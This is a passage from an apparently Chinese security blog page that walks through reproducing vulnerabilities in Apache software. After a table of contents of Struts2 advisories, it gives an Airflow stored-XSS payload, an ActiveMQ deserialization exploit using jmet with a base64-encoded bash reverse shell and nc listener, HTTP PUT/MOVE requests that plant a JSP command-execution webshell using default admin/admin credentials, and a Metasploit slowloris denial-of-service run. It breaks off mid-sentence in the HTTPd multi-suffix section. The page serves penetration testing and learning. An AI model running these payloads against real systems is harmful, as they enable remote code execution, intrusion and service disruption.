+<a href=#struts2-s2-020-%e5%b0%86commons-fileupload%e5%8d%87%e7%ba%a7%e5%88%b0%e7%89%88%e6%9c%ac131%e9%81%bf%e5%85%8ddos%e6%94%bb%e5%87%bb%e5%b9%b6%e6%b7%bb%e5%8a%a0class%e4%bb%a5%e6%8e%92%e9%99%a4parametersinterceptor%e4%b8%ad%e7%9a%84params%e9%81%bf%e5%85%8dclassloader%e6%93%8d%e4%bd%9c aria-label="Struts2 S2-020 将Commons FileUpload升级到版本1.3.1(避免DoS攻击)并添加&amp;rsquo;class&amp;rsquo;以排除ParametersInterceptor中的params(避免ClassLoader操作)">Struts2 S2-020 将Commons FileUpload升级到版本1.3.1(避免DoS攻击)并添加&rsquo;class&rsquo;以排除ParametersInterceptor中的params(避免ClassLoader操作)</a></li>
+<li>
+<a href=#struts2-s2-021-%e6%94%b9%e8%bf%9bparametersinterceptor%e5%92%8ccookieinterceptor%e4%b8%ad%e8%a2%ab%e6%8e%92%e9%99%a4%e7%9a%84%e5%8f%82%e6%95%b0%e4%bb%a5%e9%81%bf%e5%85%8dclassloader%e6%93%8d%e4%bd%9c aria-label="Struts2 S2-021 改进ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作">Struts2 S2-021 改进ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作</a></li>
+<li>
+<a href=#struts2-s2-022-%e5%9c%a8cookieinterceptor%e4%b8%ad%e6%89%a9%e5%b1%95%e6%8e%92%e9%99%a4%e7%9a%84params%e4%bb%a5%e9%81%bf%e5%85%8d%e6%93%8d%e7%ba%b5struts%e7%9a%84%e5%86%85%e9%83%a8 aria-label="Struts2 S2-022 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部">Struts2 S2-022 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部</a></li>
+<li>
+<a href=#struts2-s2-023-%e5%8f%af%e9%a2%84%e6%b5%8b%e4%bb%a4%e7%89%8c%e7%94%9f%e6%88%90%e5%80%bc aria-label="Struts2 S2-023 可预测令牌生成值">Struts2 S2-023 可预测令牌生成值</a></li>
+<li>
+<a href=#struts2-s2-024-%e9%94%99%e8%af%af%e7%9a%84excludeparams%e8%a6%86%e7%9b%96defaultexcludedpatternschecker%e4%b8%ad%e7%9a%84%e5%ae%9a%e4%b9%89%e5%80%bc aria-label="Struts2 S2-024 错误的excludeParams覆盖DefaultExcludedPatternsChecker中的定义值">Struts2 S2-024 错误的excludeParams覆盖DefaultExcludedPatternsChecker中的定义值</a></li>
+<li>
+<a href=#struts2-s2-025-%e8%b0%83%e8%af%95%e6%a8%a1%e5%bc%8f%e5%92%8c%e5%85%ac%e5%bc%80%e7%9a%84jsp%e6%96%87%e4%bb%b6%e4%b8%ad%e7%9a%84%e8%b7%a8%e7%ab%99%e7%82%b9%e8%84%9a%e6%9c%ac%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-025 调试模式和公开的JSP文件中的跨站点脚本漏洞">Struts2 S2-025 调试模式和公开的JSP文件中的跨站点脚本漏洞</a></li>
+<li>
+<a href=#struts2-s2-026-%e7%89%b9%e6%ae%8a%e7%9a%84%e5%8f%af%e7%94%a8%e4%ba%8e%e8%ae%bf%e9%97%aestruts%e5%86%85%e9%83%a8%e7%9a%84%e9%a1%b6%e7%ba%a7%e5%af%b9%e8%b1%a1 aria-label="Struts2 S2-026 特殊的可用于访问Struts内部的顶级对象">Struts2 S2-026 特殊的可用于访问Struts内部的顶级对象</a></li>
+<li>
+<a href=#struts2-s2-027-textparseutiltranslatevariables%e6%9c%aa%e8%bf%87%e6%bb%a4%e6%81%b6%e6%84%8fognl%e8%a1%a8%e8%be%be%e5%bc%8f aria-label="Struts2 S2-027 TextParseUtil.translateVariables未过滤恶意OGNL表达式">Struts2 S2-027 TextParseUtil.translateVariables未过滤恶意OGNL表达式</a></li>
+<li>
+<a href=#struts2-s2-028-%e4%bd%bf%e7%94%a8%e5%85%b7%e6%9c%89%e6%8d%9f%e5%9d%8f%e7%9a%84urldecoder%e5%ae%9e%e7%8e%b0%e7%9a%84jre%e5%8f%af%e8%83%bd%e4%bc%9a%e5%af%bc%e8%87%b4%e5%9f%ba%e4%ba%8estruts-2%e7%9a%84web%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f%e4%b8%ad%e7%9a%84xss%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-028 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞">Struts2 S2-028 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞</a></li>
+<li>
+<a href=#struts2-s2-029-%e5%9c%a8%e6%a0%87%e8%ae%b0%e5%b1%9e%e6%80%a7%e4%b8%ad%e5%af%b9%e5%8e%9f%e5%a7%8b%e7%94%a8%e6%88%b7%e8%be%93%e5%85%a5%e8%bf%9b%e8%a1%8c%e8%af%84%e4%bc%b0%e6%97%b6%e5%bc%ba%e5%88%b6%e5%8f%8cognl%e8%af%84%e4%bc%b0%e5%8f%af%e8%83%bd%e5%af%bc%e8%87%b4%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c aria-label="Struts2 S2-029 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行">Struts2 S2-029 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行</a></li>
+<li>
+<a href=#struts2-s2-030-i18ninterceptor%e4%b8%ad%e5%8f%af%e8%83%bd%e7%9a%84xss%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-030 I18NInterceptor中可能的XSS漏洞">Struts2 S2-030 I18NInterceptor中可能的XSS漏洞</a></li>
+<li>
+<a href=#struts2-s2-031-xsltresult%e8%a7%a3%e6%9e%90%e4%bb%bb%e6%84%8f%e6%a0%b7%e5%bc%8f%e8%a1%a8%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-031 XSLTResult解析任意样式表漏洞">Struts2 S2-031 XSLTResult解析任意样式表漏洞</a></li>
+<li>
+<a href=#struts2-s2-032-%e4%bd%bf%e7%94%a8%e5%8a%a8%e6%80%81%e6%96%b9%e6%b3%95%e8%b0%83%e8%af%95%e6%97%b6%e5%8f%af%e9%80%9a%e8%bf%87%e5%89%8d%e7%bc%80%e6%89%a7%e8%a1%8c%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81-cve-2016-3081 aria-label="Struts2 S2-032 使用动态方法调试时，可通过前缀执行远程代码 CVE-2016-3081">Struts2 S2-032 使用动态方法调试时，可通过前缀执行远程代码 CVE-2016-3081</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-31 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-26 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-27 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-033-%e5%bc%80%e5%90%af%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e4%b8%94%e4%bd%bf%e7%94%a8rest%e6%8f%92%e4%bb%b6%e6%97%b6%e5%8f%af%e5%af%bc%e8%87%b4%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c aria-label="Struts2 S2-033 开启动态调试且使用REST插件时可导致远程代码执行">Struts2 S2-033 开启动态调试且使用REST插件时可导致远程代码执行</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-32 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-27 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-28 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-034-ognl%e7%bc%93%e5%ad%98%e4%b8%ad%e6%af%92%e5%af%bc%e8%87%b4%e7%9a%84dos%e6%bc%8f%e6%b4%9e aria-label="Struts2 S2-034 OGNL缓存中毒导致的DoS漏洞">Struts2 S2-034 OGNL缓存中毒导致的DoS漏洞</a></li>
+<li>
+<a href=#struts2-s2-035-%e6%98%93%e5%87%ba%e9%94%99%e7%9a%84%e8%a1%8c%e5%8a%a8%e5%90%8d%e7%a7%b0%e6%b8%85%e7%90%86 aria-label="Struts2 S2-035 易出错的行动名称清理">Struts2 S2-035 易出错的行动名称清理</a></li>
+<li>
+<a href=#struts2-s2-036-%e5%9c%a8%e6%a0%87%e7%ad%be%e5%b1%9e%e6%80%a7%e5%af%b9%e5%8e%9f%e5%a7%8b%e7%94%a8%e6%88%b7%e8%be%93%e5%85%a5%e8%bf%9b%e8%a1%8c%e8%af%84%e4%bc%b0%e6%97%b6%e5%bc%ba%e5%88%b6%e5%8f%8cognl%e8%af%84%e4%bc%b0%e5%8f%af%e8%83%bd%e5%af%bc%e8%87%b4%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e7%b1%bb%e4%bc%bcs2-029 aria-label="Struts2 S2-036 在标签属性对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行漏洞(类似S2-029)">Struts2 S2-036 在标签属性对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行漏洞(类似S2-029)</a></li>
+<li>
+<a href=#struts2-s2-037-%e4%bd%bf%e7%94%a8rest%e6%8f%92%e4%bb%b6%e6%97%b6%e5%8f%af%e5%ae%9e%e7%8e%b0%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c aria-label="Struts2 S2-037 使用REST插件时可实现远程代码执行">Struts2 S2-037 使用REST插件时可实现远程代码执行</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-33 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-28 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-29 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#struts2-s2-045-%e5%9f%ba%e4%ba%8ejakarta-multipart%e8%a7%a3%e6%9e%90%e5%99%a8%e6%89%a7%e8%a1%8c%e6%96%87%e4%bb%b6%e4%b8%8a%e8%bd%bd%e6%97%b6%e5%8f%af%e8%83%bd%e7%9a%84%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81 aria-label="Struts2 S2-045 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码">Struts2 S2-045 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-34 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-29 aria-label=影响版本>影响版本</a></li></ul>
+</li>
+<li>
+<a href=#zeppelin-%e6%9c%aa%e6%8e%88%e6%9d%83%e4%bb%bb%e6%84%8f%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e aria-label="Zeppelin 未授权任意命令执行漏洞">Zeppelin 未授权任意命令执行漏洞</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-35 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-30 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-30 aria-label=漏洞复现>漏洞复现</a></li></ul>
+</li>
+<li>
+<a href=#zookeeper-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e-cve-2014-085 aria-label="Zookeeper 未授权访问漏洞 CVE-2014-085">Zookeeper 未授权访问漏洞 CVE-2014-085</a><ul>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0-36 aria-label=漏洞描述>漏洞描述</a></li>
+<li>
+<a href=#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac-31 aria-label=影响版本>影响版本</a></li>
+<li>
+<a href=#%e5%a4%8d%e7%8e%b0%e6%80%9d%e8%b7%af-10 aria-label=复现思路>复现思路</a></li>
+<li>
+<a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-31 aria-label=漏洞复现>漏洞复现</a>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h1 id=airflow-存储型xss>Airflow 存储型XSS<a hidden class=anchor aria-hidden=true href=#airflow-存储型xss>#</a></h1>
+<h2 id=漏洞描述>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述>#</a></h2>
+<p><code>Apache Airflow 1.10.2</code>及之前版本的<code>airflow webserver</code>服务存在<code>XSS</code>漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。</p>
+<h2 id=影响版本>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本>#</a></h2>
+<p><code>Apache Airflow 1.10.3</code>以下版本。</p>
+<h2 id=漏洞复现>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现>#</a></h2>
+<p>访问<code>/admin/dagrun/</code>(默认不需要密码)。</p>
+<p>创建一个项目，输入<code>ID</code>后点击保存，返回列表，点击<code>running</code>字样，发现能够输入<code>HTML</code>代码，例：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span>&gt;<span style=color:#ae81ff>_</span><span style=color:#a6e22e>a</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://www.baidu.com&#34;</span>&lt;/<span style=color:#f92672>script</span>&gt;
+&lt;<span style=color:#f92672>script</span>&gt;document.<span style=color:#a6e22e>location</span><span style=color:#f92672>=</span><span style=color:#ae81ff>_</span><span style=color:#a6e22e>a</span>&lt;/<span style=color:#f92672>script</span>&gt; 
+</code></pre></div><p>能直接造成存储型<code>XSS</code>。</p>
+<h1 id=activemq-反序列化漏洞-cve-2015-5254>ActiveMQ 反序列化漏洞 CVE-2015-5254<a hidden class=anchor aria-hidden=true href=#activemq-反序列化漏洞-cve-2015-5254>#</a></h1>
+<h2 id=漏洞描述-1>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-1>#</a></h2>
+<p><code>Apache ActiveMQ</code>是<code>Apache</code>软件经济会研发的一套开源消息中间件，支持<code>Java</code>消息服务、集群、<code>Spring Framework</code>等。<code>Apache ActiveMQ 5.13.0</code>之前版本，即<code>5.x</code>版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化<code>Java消息服务(JMS) ObjectMessage</code>对象实现任意代码执行。</p>
+<h2 id=影响版本-1>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-1>#</a></h2>
+<p><code>Apache ActiveMQ 5.13.0</code>之前的<code>5.x</code>版本。</p>
+<h2 id=复现思路>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路>#</a></h2>
+<p>1.构造（可使用<code>ysoserial</code>）可执行命令的序列化对象。</p>
+<p>2.作为一个消息，发送给目标对应端口。</p>
+<p>3.访问<code>Web</code>管理页面，读取消息，触发漏洞。</p>
+<h2 id=漏洞复现-1>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-1>#</a></h2>
+<p>使用<code>jmet</code>进行漏洞利用：<a href=https://github.com/ianxtianxt/jmet>ianxtianxt/jmet: Java Message Exploitation Tool (github.com)</a></p>
+<blockquote>
+<p>下载好之后在<code>jmet-0.1.0-all.jar</code>同级目录下创建<code>external</code>文件夹，避免出现文件夹不存在的报错。</p>
+<p><code>jmet</code>的原理是使用jar包内置<code>ysoserial</code>生成<code>Payload</code>并发送，我们需要在<code>ysoserial</code>的<code>gadget</code>选择一个可使用的，如<code>ROME</code>。</p>
+</blockquote>
+<p>给目标<code>ActiveMQ</code>添加一个名为<code>event</code>的队列，点击事件为生成<code>/tmp/vuln</code>文件：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span style=color:#e6db74>&#34;touch /tmp/vuln&#34;</span> -Yp ROME &lt;ip&gt; &lt;port&gt;
+
+<span style=color:#75715e># 命令执行成功后回显如下</span>
+INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Connected with ID: ID:&lt;server-id&gt;
+INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Sent gadget <span style=color:#e6db74>&#34;ROME&#34;</span> with command: <span style=color:#e6db74>&#34;touch /tmp/vuln&#34;</span>
+INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Shutting down connection ID:&lt;server-id&gt;
+</code></pre></div><p>访问<code>http://&lt;ip>:&lt;port>/admin/browse.jsp?JMSDestination=event</code>查看消息队列，访问页面需要登录，默认账密如下：</p>
+<pre tabindex=0><code>admin/admin
+</code></pre><p>点击页面<code>Message ID</code>下的<code>ID:server-id</code>字段触发文件创建命令，在受害端查看命令是否执行成功：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ls /tmp
+</code></pre></div><p>确认<code>/tmp/vuln</code>文件存在后即可进一步创建<code>反弹shell</code>。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;<span style=color:#ae81ff>1</span>
+<span style=color:#75715e># Base64编码</span>
+YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx
+
+bash -c <span style=color:#f92672>{</span>echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx<span style=color:#f92672>}</span>|<span style=color:#f92672>{</span>base64,-d<span style=color:#f92672>}</span>|<span style=color:#f92672>{</span>bash,-i<span style=color:#f92672>}</span>
+
+<span style=color:#75715e># 发送payload</span>
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span style=color:#e6db74>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i}&#34;</span> -Yp ROME &lt;ip&gt; &lt;port&gt;
+
+<span style=color:#75715e># INFO如下</span>
+INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Connected with ID： ID：&lt;server-id&gt;
+INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Sent gadget <span style=color:#e6db74>&#34;ROME&#34;</span> with command： <span style=color:#e6db74>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4yMzMuNzYvODg4MyAwPiYx}|{base64,-d}|{bash,-i}&#34;</span>
+INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Shutting down connection ID：&lt;server-id&gt;
+</code></pre></div><p>执行成功后，在监听端打开<code>nc</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvvp &lt;port&gt;
+</code></pre></div><p>继续到<code>http://&lt;ip>:&lt;port>/admin/browse.jsp?JMSDestination=event</code>页面，点击字段触发<code>反弹shell</code>，成功连接。</p>
+<h1 id=activemq-任意文件写入漏洞-cve-2016-3088>ActiveMQ 任意文件写入漏洞 CVE-2016-3088<a hidden class=anchor aria-hidden=true href=#activemq-任意文件写入漏洞-cve-2016-3088>#</a></h1>
+<h2 id=漏洞描述-2>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-2>#</a></h2>
+<p><code>ActiveMQ</code>中的<code>FileServer</code>服务允许用户通过<code>PUT</code>方法上传文件到指定目录。<code>FileServer</code>是存储文件的接口，支持写入文件（不解析<code>jsp</code>）、移动文件（<code>Move</code>）。</p>
+<h2 id=影响版本-2>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-2>#</a></h2>
+<p><code>ActiveMQ 5.x ~ 5.14.0</code>，但在<code>5.12.x ~ 5.13.x</code>版本中默认关闭<code>fileserver应用</code>(可在<code>conf/jetty.xml</code>中开启)。在<code>5.14.0</code>版本后<code>fileserver</code>应用被彻底删除。</p>
+<h2 id=复现思路-1>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-1>#</a></h2>
+<p>1.<code>PUT</code>一个<code>webshell</code>到<code>fileserver</code>目录。</p>
+<p>2.若不能执行则移动<code>webshell</code>到有权限目录。</p>
+<h2 id=漏洞复现-2>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-2>#</a></h2>
+<p>访问<code>http://&lt;ip>:8161</code>，先登录，默认账密：</p>
+<pre tabindex=0><code>admin/admin
+</code></pre><p>使用<code>bp</code>构造如下请求包：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PUT /fileserver/a.jsp HTTP/1.1
+Host: &lt;<span style=color:#f92672>ip</span>&gt;:&lt;<span style=color:#f92672>port</span>&gt;
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46YWRtaW4=
+Upgrade-Insecure-Requests： 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT
+Connection: close
+Content-Length: 349
+
+<span style=color:#960050;background-color:#1e0010>&lt;</span>%@ page import=&#34;java.io.*&#34;%&gt;
+<span style=color:#960050;background-color:#1e0010>&lt;</span>%
+ out.print(&#34;Hello&lt;/<span style=color:#f92672>br</span>&gt;&#34;);
+ String strcmd = request.getParameter(&#34;cmd&#34;);
+ String line = null;
+ Process p = Runtime.getRuntime().exec(strcmd);
+ BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+ while((line = br.readLine()) != null){
+ 	out.print(line + &#34;&lt;/<span style=color:#f92672>br</span>&gt;&#34;);
+ }
+%&gt;
+</code></pre></div><p>响应包如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>204</span> <span style=color:#a6e22e>No Content</span>
+Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
+Server<span style=color:#f92672>:</span> <span style=color:#ae81ff>Jetty(8.1.16.v20140903)</span>
+</code></pre></div><p>查看<code>webshell</code>能否执行：<code>http://&lt;ip>:&lt;ip>/fileserver/a.jsp</code>，发现文件原样输出，没有被解析，当前目录没有执行权限。所以需要考虑移动文件至<code>/webapps/api</code>或<code>/webapps/admin</code>可解析<code>jsp</code>的目录下。</p>
+<p>要移动文件，必然就需要路径，以下为两种获取路径的方法：</p>
+<p>1.访问<code>http://&lt;ip>:8161admin/test/systemProperties.jsp</code></p>
+<p>2.构造错误上传路径，爆出绝对路径，如：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PUT /fileserver/a/b HTTP/1.1
+</code></pre></div><p>实测<code>ActiveMQ 5.11.1</code>版本无法利用。</p>
+<p>使用第一种方法，查看到文件路径为<code>root/apache-activemq-5.11.1</code>，下面把<code>a.jsp</code>文件移动到<code>/webapps/admin</code>目录下，构造包如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#960050;background-color:#1e0010>MOVE /fileserver/a.jsp HTTP/1.1
+</span><span style=color:#960050;background-color:#1e0010>Destination: file：///root/apache-activemq-5.11.1/webapps/admin/a.jsp
+</span><span style=color:#960050;background-color:#1e0010>Host: &lt;ip&gt;:8161
+</span><span style=color:#960050;background-color:#1e0010>Cache-Control: max-age=0
+</span><span style=color:#960050;background-color:#1e0010>Authorization: Basic YWRtaW46YWRtaW4=
+</span><span style=color:#960050;background-color:#1e0010>Upgrade-Insecure-Requests: 1
+</span><span style=color:#960050;background-color:#1e0010>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+</span><span style=color:#960050;background-color:#1e0010>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+</span><span style=color:#960050;background-color:#1e0010>Accept-Encoding: gzip, deflate
+</span><span style=color:#960050;background-color:#1e0010>Accept-Language: zh-CN,zh;q=0.9
+</span><span style=color:#960050;background-color:#1e0010>If-Modified-Since: Fri, 13 Feb 2015 18:05:11 GMT
+</span><span style=color:#960050;background-color:#1e0010>Connection: close
+</span></code></pre></div><p>响应包如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>204</span> <span style=color:#a6e22e>No Content</span>
+Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
+Server<span style=color:#f92672>:</span> <span style=color:#ae81ff>Jetty(8.1.16.v20140903)</span>
+</code></pre></div><p>此时我们就可以使用<code>webshell</code>了：<code>http://&lt;ip>:8161/admin/a.jsp?cmd=ls</code>。</p>
+<h1 id=ddos-cve-2007-6750>DDOS CVE-2007-6750<a hidden class=anchor aria-hidden=true href=#ddos-cve-2007-6750>#</a></h1>
+<h2 id=漏洞描述-3>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-3>#</a></h2>
+<p><code>Apache HTTP服务器2.2.15</code>之前版本中缺少<code>mod_ReqTimeout</code>模块，<code>1.x</code>和<code>2.x</code>版本允许远程攻击者通过部分<code>HTTP</code>请求造成拒绝服务（守护进程中断），如<code>Slowloris</code>。</p>
+<h2 id=影响版本-3>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-3>#</a></h2>
+<p><code>Apache 1.x ~ 2.x</code></p>
+<h2 id=复现思路-2>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-2>#</a></h2>
+<p>1.检查存活。</p>
+<p>2.<code>msf</code>进一步验证。</p>
+<h2 id=漏洞复现-3>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-3>#</a></h2>
+<p>首先使用<code>nmap</code>查看<code>Apache</code>版本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -sV -p80 &lt;ip&gt;
+</code></pre></div><p>然后进一步访问网页，查看网页是否正常。</p>
+<p>使用msf执行攻击：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfconsole <span style=color:#75715e># 启动metasploit</span>
+use auxiliary/dos/http/slowloris <span style=color:#75715e># 使用模块</span>
+set RHOST &lt;ip&gt; <span style=color:#75715e># 设置目标IP</span>
+run <span style=color:#75715e># 执行攻击</span>
+</code></pre></div><h1 id=httpd-多后缀解析漏洞>HTTPd 多后缀解析漏洞<a hidden class=anchor aria-hidden=true href=#httpd-多后缀解析漏洞>#</a></h1>
+<h2 id=漏洞描述-4>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-4>#</a></h2>
+<p><code>Apache HTTPD</code>支持一个文件拥有多个后缀并根据不同后缀执行不同指令，示例配置文件如下：</p>
+<pre tabindex=0><code>AddType text/html .html
+AddLanguage zh-CN .cn
+</code></pre><p>配置文件给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，若用户请求文件<code>index.cn.html</code>，服务器将返回一个中文<code>html</code>页面。这就是<code>Apache</code>多后缀特性。</p>
+<p>若运维人员给<code>.php</code>后缀增加了处理器：</p>
